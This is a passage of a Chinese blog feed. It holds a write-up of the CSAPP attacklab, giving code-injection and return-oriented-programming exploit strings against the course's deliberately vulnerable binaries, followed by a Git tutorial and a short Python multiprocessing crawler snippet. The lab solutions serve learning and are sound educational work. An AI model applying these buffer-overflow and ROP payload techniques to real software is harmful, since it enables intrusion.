title="总结"></a>总结</h2><p>之前写过，基本上全是看别人的解答写的，全部忘记了，隐藏关卡没写。</p><p>这次写完全是靠自己慢慢摸索写完的。从bomblab可以学到不少：</p><p>​汇编代码基本能看懂，gdb调试，tmux分屏 等等</p><p><img src="/2024/02/17/CSAPP/image-20240221154454691.png" alt="image-20240221154454691"></p><h1 id="attacklab"><a href="#attacklab" class="headerlink" title="attacklab"></a>attacklab</h1><p><code>ctarget</code> and <code>rtarget</code>两个二进制程序，有<code>buffer overflow bug</code></p><p>二进制程序：</p><p>​<code>ctarget</code>: An executable program vulnerable to code-injection attacks.</p><p>​<code>rtarget</code>: An executable program vulnerable to return-oriented programming attacks.<br>​<code>hex2raw</code> converts these strings into a sequence of raw bytes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix&gt; cat exploit.txt | ./hex2raw | ./ctarget</span><br></pre></td></tr></table></figure><p>​<code>farm.c</code>: The source code of this target’s &#96;&#96;gadget farm,’’ which are<br>​    used in generating return-oriented programming attacks.</p><h2 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h2><h3 id="ctarget"><a href="#ctarget" class="headerlink" title="ctarget"></a>ctarget</h3><h4 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h4><p>根据官方的 pdf ，执行<code>test</code>函数时在<code>getbuf</code>函数返回时跳转到<code>touch1</code>函数。</p><p>首先使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s# 得到程序的汇编代码</span><br></pre></td></tr></table></figure><p>在<code>ctarget.s</code>文件中查看<code>getbuf</code>函数</p><p><img src="/2024/02/17/CSAPP/image-20240222190139430.png" alt="image-20240222190139430"></p><p>得到<code>BUFFER_SIZE</code>的大小为<code>0x28</code>即40。</p><p>因此我们填入40个字符加上<code>touch</code>函数的地址。</p><p><img src="/2024/02/17/CSAPP/image-20240222192017133.png" alt="image-20240222192017133"></p><p>上方的40个字符随意，下面的是<code>00000000004017c0</code>，<code>touch1</code>的地址，按小端法存放。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt; phase1.txt &gt; phase1_ans.txt# 将答案文件作为输入放入程序中</span><br><span class="line"># 执行文件，通过phase1</span><br><span class="line">./ctarget -i phase1_ans.txt -q</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240222192402619.png" alt="image-20240222192402619"></p><h4 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h4><p>需要跳转到<code>touch2</code>函数，但是要求我们需要带参数<code>cookie</code>参数已经告诉我们是存放在<code>rdi</code>中，值为<code>0x59b997fa</code>。</p><p>解题思路：</p><p>​执行到test函数中的getbuf函数，读取我们输入的字符串并修改test函数的返回值。</p><p>​我们知道函数执行前会先将参数值push进栈。所以我们不能直接返回touch2的地址(<code>00000000004017ec</code>)。</p><p>​因此我们需要返回到我们注入的代码地址，执行完代码之后再返回到touch2函数的位置。</p><p>​汇编语言中ret指令实质上是跳转到栈顶存储的位置。栈顶位置<code>0x5561dc78</code></p><p>​</p><p>需要注入的汇编代码：(code.s)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq $0x59b997fa,%rdi   # push the value of cookie</span><br><span class="line">pushq $0x4017ec                 # touch2 address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后编译反编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c code.s</span><br><span class="line">objdump -d code.o</span><br></pre></td></tr></table></figure><p>查看code.o可以得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure><p>因为我们要先跳转到栈上执行我们注入的命令，所以先调试一下程序在getbuf函数下断点，等分好getbuf的栈帧，查看一下位置即可。是<code>0x5561dc78</code></p><p>最终输入为：(phase2.txt)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat phase2.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240222213546729.png" alt="image-20240222213546729"></p><h4 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h4><p>需要我们把参数由数字改成字符串传入。</p><p><code>touch3</code> ： <code>0x4018fa</code></p><p>输入位置：<code>0x5561dc78</code></p><p><code>cookie</code> : <code>0x59b997fa</code></p><p>答案是这个：</p><p><img src="/2024/02/17/CSAPP/image-20240225212255938.png" alt="image-20240225212255938"></p><p>最后一行是cookie的字符串的hex，不放在中间的原因是在hexmatch函数里会分配一个比较大的空间在栈上，把前面的全部覆盖，但是最后一行的话是到了test函数的栈帧，所以不会覆盖。</p><h3 id="rtarget"><a href="#rtarget" class="headerlink" title="rtarget"></a>rtarget</h3><h4 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h4><p><strong>目标：完成phase2的任务</strong></p><p>movq : The codes for these are shown in Figure 3A.<br>    popq : The codes for these are shown in Figure 3B.<br>    ret : This instruction is encoded by the single byte 0xc3.<br>    nop : This instruction (pronounced “no op,” which is short for “no operation”) is encoded by the single byte 0x90. Its only effect is to cause the program counter to be incremented by 1.</p><p>Some Advice:</p><ul><li>All the gadgets you need can be found in the region of the code for rtarget demarcated by the<br>functions start_farm and mid_farm.</li><li>You can do this attack with just two gadgets.</li><li>When a gadget uses a popq instruction, it will pop data from the stack. As a result, your exploit<br>string will contain a combination of gadget addresses and data.</li></ul><p>可以：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop $rax$58</span><br><span class="line">​mov $rax$, %rdi  48 89 c7</span><br><span class="line">​ret c3</span><br></pre></td></tr></table></figure><p>栈：</p><p> 先到此处4019ab，pop %rax(栈上放0x59b997fa 4019c5)，ret 到 4019c5, 执行mov $rax$, %rdi,然后ret 到touch2(栈上放4017ec，即touch2)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00# 最初跳转到&lt;addval_219&gt;内执行pop %rax 和 ret指令</span><br><span class="line">fa 97 b9 59 00 00 00 00 # 放入栈中等pop %rax指令</span><br><span class="line">c5 19 40 00 00 00 00 00# 执行&lt;addval_219&gt;的ret指令，存放的是&lt;setval_426&gt;中的位置，执行将参数cookie放入%rdi和ret返回touch2的位置</span><br><span class="line">ec 17 40 00 00 00 00 00# 存放touch2的地址，执行&lt;setval_426&gt;的ret指令时到达</span><br></pre></td></tr></table></figure><p><img src="/2024/02/17/CSAPP/image-20240227180827121.png" alt="image-20240227180827121"></p><h4 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h4><p><code>touch3</code> ： <code>0x4018fa</code></p><p><code>cookie</code> : <code>0x59b997fa</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00# movq %rsp, %rax</span><br><span class="line">c5 19 40 00 00 00 00 00# movq %rax, %rdi</span><br><span class="line">ab 19 40 00 00 00 00 00# popq %rax</span><br><span class="line">40 00 00 00 00 00 00 00# 0x40</span><br><span class="line">dd 19 40 00 00 00 00 00# movl %eax, %edx</span><br><span class="line">69 1a 40 00 00 00 00 00# movl %edx, %ecx</span><br><span class="line">13 1a 40 00 00 00 00 00# movl %ecx, %esi</span><br><span class="line">d6 19 40 00 00 00 00 00# lea  (%rdi,%rsi,1),%rax</span><br><span class="line">c5 19 40 00 00 00 00 00# movq %rax, %rdi</span><br><span class="line">fa 18 40 00 00 00 00 00# touch3</span><br><span class="line">35 39 62 39 39 37 66 61 00 # cookie </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/505497911&quot;&gt;CSAPP一键环境配置、完成8个lab总结 - 知乎 (zhihu.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;datalab&quot;&gt;&lt;a href=&quot;#d</summary>
      
    
    
    
    <category term="体系结构" scheme="https://1xueyu1.github.io/categories/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    
    <category term="CSAPP" scheme="https://1xueyu1.github.io/categories/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/CSAPP/"/>
    
    
  </entry>
  
  <entry>
    <title>Git-tutorial</title>
    <link href="https://1xueyu1.github.io/2024/02/16/Git-learning/"/>
    <id>https://1xueyu1.github.io/2024/02/16/Git-learning/</id>
    <published>2024-02-16T08:39:01.000Z</published>
    <updated>2024-03-15T02:24:51.022Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304">创建版本库 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p><h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="仓库管理"><a href="#仓库管理" class="headerlink" title="仓库管理"></a>仓库管理</h2><ul><li><p><code>git init</code>将当前目录变成Git可以管理的仓库</p></li><li><p><code>git add</code>将指定文件添加到仓库</p></li></ul><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line">$ git add .</span><br></pre></td></tr></table></figure><ul><li><p><code>git commit -m &quot;explanation text&quot;</code>告诉Git，把文件提交到仓库</p></li><li><p><code>git status</code>显示当前仓库状态</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">modified:   readme.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure><p>上面的命令输出告诉我们，<code>readme.txt</code>被修改过了，但还没有准备提交的修改。</p><p><img src="/2024/02/16/Git-learning/image-20240216165813680.png" alt="image-20240216165813680"></p><p><img src="/2024/02/16/Git-learning/image-20240216170024339.png" alt="image-20240216170024339"></p><p>红色代表文件被修但是没被添加到仓库中</p><p>绿色代表文件已经被添加到仓库中，并且可以commit了</p><ul><li><code>git diff file</code> 查看文件修改内容 (<strong>暂存区</strong>和<strong>工作区</strong>的文件不同)</li><li><code>git diff HEAD readme.md</code>查看（<strong>最近一次提交</strong>和<strong>暂存区</strong>的文件内容的不同）</li></ul><p>虽然Git告诉我们<code>readme.txt</code>被修改了，但如果能看看具体修改了什么内容，自然是很好的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git diff readme.txt </span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">index 46d49bf..9247db6 100644</span><br><span class="line">--- a/readme.txt</span><br><span class="line">+++ b/readme.txt</span><br><span class="line">@@ -1,2 +1,2 @@</span><br><span class="line">-Git is a version control system.</span><br><span class="line">+Git is a distributed version control system.</span><br><span class="line"> Git is free software.</span><br></pre></td></tr></table></figure><h2 id="Git-版本控制"><a href="#Git-版本控制" class="headerlink" title="Git 版本控制"></a>Git 版本控制</h2><ul><li><code>git log</code> 显示从最近到最远的提交日志</li></ul><p><img src="/2024/02/16/Git-learning/image-20240216170429663.png" alt="image-20240216170429663"></p><p>如果嫌输出信息太多，看得眼花缭乱的，可以试试加上<code>--pretty=oneline</code>参数：</p><p><img src="/2024/02/16/Git-learning/image-20240216170603449.png" alt="image-20240216170603449"></p><h3 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h3><p>首先，Git必须知道当前版本是哪个版本，在Git中，用<code>HEAD</code>表示当前版本, 上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>, 多个版本可以写成<code>HEAD~100</code>。</p><ul><li><code>git reset --hard commit_id</code> 将版本回退</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard HEAD^</span><br><span class="line">HEAD is now at e475afc add distributed</span><br></pre></td></tr></table></figure><p><code>--hard</code>参数有啥意义？这个后面再讲，现在你先放心使用。</p><p>下面回退到上一个版本，可以发现文件内容已经改变了</p><p><img src="/2024/02/16/Git-learning/image-20240216171541456.png" alt="image-20240216171541456"></p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，版本回退实际上是指针指向另一个状态。</p><p>如果向找回版本，即第三次commit，现在又找不到它的版本号，可以使用命令<code>git reflog</code></p><ul><li><code>git reflog</code>显示你的每一次命令</li></ul><p><img src="/2024/02/16/Git-learning/image-20240216172246717.png" alt="image-20240216172246717"></p><p>从输出可知上一个版本的commit_id</p><p><img src="/2024/02/16/Git-learning/image-20240216172416962.png" alt="image-20240216172416962"></p><p>然后返回到最开始的版本</p><h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><h4 id="工作区（Working-Directory）"><a href="#工作区（Working-Directory）" class="headerlink" title="工作区（Working Directory）"></a>工作区（Working Directory）</h4><p>就是你在电脑里能看到的目录</p><h4 id="版本库（Repository）"><a href="#版本库（Repository）" class="headerlink" title="版本库（Repository）"></a>版本库（Repository）</h4><p>工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库。</p><p>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p><img src="/2024/02/16/Git-learning/image-20240216173312670.png" alt="image-20240216173312670"></p><p>分支和<code>HEAD</code>的概念后面再看</p><p>前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的：</p><p>第一步是用<code>git add</code>把文件添加进去，实际上就是把文件修改添加到暂存区；</p><p>第二步是用<code>git commit</code>提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p><p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个<code>master</code>分支，所以，现在，<code>git commit</code>就是往<code>master</code>分支上提交更改。</p><p>你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p><p><img src="/2024/02/16/Git-learning/image-20240216173704830.png" alt="image-20240216173704830"></p><p>当前一个文件被修改了，另一个还从来没有被添加过，所以状态时<code>Untracked</code>。</p><p><img src="/2024/02/16/Git-learning/image-20240216173850786.png" alt="image-20240216173850786"></p><p>当前两个文件都被添加到暂存区中了，然后commit，暂存区就清空了</p><p><img src="/2024/02/16/Git-learning/image-20240216174145248.png" alt="image-20240216174145248"></p><p>提交后，用<code>git diff HEAD -- readme.txt</code>命令可以查看工作区和版本库里面最新版本的区别：</p><p>通过下面操作</p><p>第一次修改 -&gt; <code>git add</code> -&gt; 第二次修改 -&gt; <code>git commit</code></p><p>可以发现第二次修改在暂存区中，第一次修改被提交了</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><code>git add</code>添加到暂存区中，<code>git commit</code>提交到版本库中</p><h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><h3 id="未添加到暂存区"><a href="#未添加到暂存区" class="headerlink" title="未添加到暂存区"></a>未添加到暂存区</h3><p><code>git checkout -- file</code>可以丢弃工作区的修改：</p><p>命令<code>git checkout -- readme.md</code>意思就是，把<code>readme.md</code>文件在工作区的修改全部撤销,<code>readme.md</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；即最近一次<code>git commit</code></p><p><code>git checkout -- file</code>命令中的<code>--</code>很重要，没有<code>--</code>，就变成了“切换到另一个分支”的命令，我们在后面的分支管理中会再次遇到<code>git checkout</code>命令。</p><p><code>git reset</code>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用<code>HEAD</code>时，表示最新的版本。</p><h3 id="已经添加到暂存区"><a href="#已经添加到暂存区" class="headerlink" title="已经添加到暂存区"></a>已经添加到暂存区</h3><p>命令<code>git reset HEAD &lt;file&gt;</code>可以把暂存区的修改撤销掉（unstage），重新放回工作区：</p><p><img src="/2024/02/16/Git-learning/image-20240216180959059.png" alt="image-20240216180959059"></p><p>现在暂存区是干净的，工作区有修改</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><ul><li>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令<code>git checkout -- file</code>。</li><li>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令<code>git reset HEAD &lt;file&gt;</code>，就回到了场景1，第二步按场景1操作。</li><li>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，<code>git reset HEAD^</code>，不过前提是没有推送到远程库。</li></ul><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><ul><li><p><code>git rm file</code>删除版本库的文件</p></li><li><p>另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -- test.txt</span><br></pre></td></tr></table></figure><p><code>git checkout</code>其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。</p></li></ul><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><h3 id="添加远程仓库"><a href="#添加远程仓库" class="headerlink" title="添加远程仓库"></a>添加远程仓库</h3><p>将本地仓库与远程仓库关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github.com:your repo</span><br></pre></td></tr></table></figure><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们第一次推送<code>master</code>分支时，加上了<code>-u</code>参数，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><h3 id="删除远程仓库"><a href="#删除远程仓库" class="headerlink" title="删除远程仓库"></a>删除远程仓库</h3><p>如果添加的时候地址写错了，或者就是想删除远程库，可以用<code>git remote rm &lt;name&gt;</code>命令。使用前，建议先用<code>git remote -v</code>查看远程库信息：</p><p><img src="/2024/02/16/Git-learning/image-20240216192231561.png" alt="image-20240216192231561"></p><p>然后，根据名字删除，比如删除<code>origin</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm origin</span><br></pre></td></tr></table></figure><p>此处的“删除”其实是解除了本地和远程的绑定关系，并不是物理上删除了远程库。远程库本身并没有任何改动。要真正删除远程库，需要登录到GitHub，在后台页面找到删除按钮再删除。</p><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。</p><h3 id="创建分支"><a href="#创建分支" class="headerlink" title="创建分支"></a>创建分支</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b branchName</span><br></pre></td></tr></table></figure><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git branch branchName</span><br><span class="line">$ git checkout branchName</span><br></pre></td></tr></table></figure><p>然后，用<code>git branch</code>命令查看当前分支</p><h3 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h3><p><code>git merge</code>命令用于合并指定分支到当前分支。</p><h3 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d branchName</span><br></pre></td></tr></table></figure><hr><hr><hr><p><code>git switch -c branchName</code> 创建并切换到新分支</p><h3 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h3><p>Git鼓励大量使用分支：</p><p>查看分支：<code>git branch</code></p><p>创建分支：<code>git branch &lt;name&gt;</code></p><p>切换分支：<code>git checkout &lt;name&gt;</code>或者<code>git switch &lt;name&gt;</code></p><p>创建+切换分支：<code>git checkout -b &lt;name&gt;</code>或者<code>git switch -c &lt;name&gt;</code></p><p>合并某分支到当前分支：<code>git merge &lt;name&gt;</code></p><p>删除分支：<code>git branch -d &lt;name&gt;</code></p><h3 id="解决合并分支的冲突"><a href="#解决合并分支的冲突" class="headerlink" title="解决合并分支的冲突"></a>解决合并分支的冲突</h3><p>用带参数的<code>git log</code>也可以看到分支的合并情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br></pre></td></tr></table></figure><p><img src="/2024/02/16/Git-learning/image-20240216202709111.png" alt="image-20240216202709111"></p><h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br></pre></td></tr></table></figure><p>强制禁用<code>Fast forward</code>模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p><h3 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h3><p>当前正在<code>dev</code>上进行的工作还没有提交，但是，必须在两个小时内修复该bug。</p><p>Git还提供了一个<code>stash</code>功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作：</p><p><img src="/2024/02/16/Git-learning/image-20240216205936280.png" alt="image-20240216205936280"></p><p>首先确定要在哪个分支上修复bug，假定需要在<code>master</code>分支上修复，就从<code>master</code>创建临时分支：</p><p>修改好bug之后<code>git add .</code>, <code>git commit -m &quot;xxx&quot;</code>, 回到master branch 进行合并， <code>git merge --no-ff -m &quot;xxx&quot; issue-101</code>, <code>git branch -d issue-101</code></p><p>然后回到工作现场<code>git switch dev</code>, </p><ul><li><code>git stash list</code>查看保存的工作现场</li></ul><h4 id="恢复工作现场"><a href="#恢复工作现场" class="headerlink" title="恢复工作现场"></a>恢复工作现场</h4><ol><li><code>git stash apply</code>: 但是恢复后，stash内容并不删除，你需要用<code>git stash drop</code>来删除；</li><li>另一种方式是用<code>git stash pop</code>，恢复的同时把stash内容也删了：</li></ol><p><img src="/2024/02/16/Git-learning/image-20240216211356780.png" alt="image-20240216211356780"></p><p>在master分支上修复了bug后，我们要想一想，dev分支是早期从master分支分出来的，所以，这个bug其实在当前dev分支上也存在。</p><p>同样的bug，要在dev上修复，我们只需要把<code>fix bug 101</code>这个提交所做的修改“复制”到dev分支。注意：我们只想复制<code> fix bug 101</code>这个提交所做的修改，并不是把整个master分支merge过来。</p><p>为了方便操作，Git专门提供了一个<code>cherry-pick</code>命令，让我们能复制一个特定的提交到当前分支：</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.liaoxuefeng.com/wiki/896043488029600/896827951938304&quot;&gt;创建版本库 - 廖雪峰的官方网站 (liaoxuefeng.com)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id</summary>
      
    
    
    
    <category term="工具" scheme="https://1xueyu1.github.io/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="Git" scheme="https://1xueyu1.github.io/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>多进程</title>
    <link href="https://1xueyu1.github.io/2024/02/07/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>https://1xueyu1.github.io/2024/02/07/%E5%A4%9A%E8%BF%9B%E7%A8%8B/</id>
    <published>2024-02-07T13:24:29.000Z</published>
    <updated>2024-02-07T14:52:17.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.pool <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多进程爬取</span></span><br><span class="line">    pool = Pool(<span class="number">5</span>)</span><br><span class="line">    pool.<span class="built_in">map</span>(handle, urls)</span><br><span class="line">    pool.close()</span><br><span class="line">    pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;多进程&quot;&gt;&lt;a href=&quot;#多进程&quot; class=&quot;headerlink&quot; title=&quot;多进程&quot;&gt;&lt;/a&gt;多进程&lt;/h2&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;</summary>
      
    
    
    
    <category term="python" scheme="https://1xueyu1.github.io/categories/python/"/>
    
    <category term="爬虫" scheme="https://1xueyu1.github.io/categories/python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>bs4解析</title>
    <link href="https://1xueyu1.github.io/2024/02/07/bs4%E8%A7%A3%E6%9E%90/"/>
    <id>https://1xueyu1.github.io/2024/02/07/bs4%E8%A7%A3%E6%9E%90/</id>
    <published>2024-02-07T12:34:01.000Z</published>
    <updated>2024-02-07T14:52:20.575Z</updated>
    
